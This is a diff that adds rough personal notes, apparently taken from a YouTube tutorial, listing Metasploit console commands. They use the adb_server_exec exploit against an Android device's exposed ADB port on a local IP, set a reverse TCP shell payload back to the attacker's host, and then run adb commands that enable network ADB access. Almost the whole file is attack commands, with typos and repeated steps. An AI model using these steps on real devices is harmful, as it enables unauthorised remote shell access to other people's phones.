@@ -1,0 +1,33 @@
+https://www.youtube.com/watch?v=CWDLbZHyhA0
+/etc/init.d/postgresql status
+runing 
+msfconsole
+msf>
+
+	use exploit/android/adb/adb_server_exec
+	show options
+		show targets
+		set RHOST 192.168.1.114
+		set RHOST 5555
+		clear
+		set RHOST 192.168.1.114
+		RPORT
+		set payloads linux/armle/shell_reverse_tcp
+		set LHOST
+			set LHOST 192.168.1.117
+			set LPORT 5555
+			clear
+			show options
+				   exploit
+
+lsusb
+adb start-server
+adb devices
+adb shell
+uname -rms
+	
+	busybox ifconfig
+	192.168.1.114
+		exit
+		ifconfig
+				adb tcpip 5555
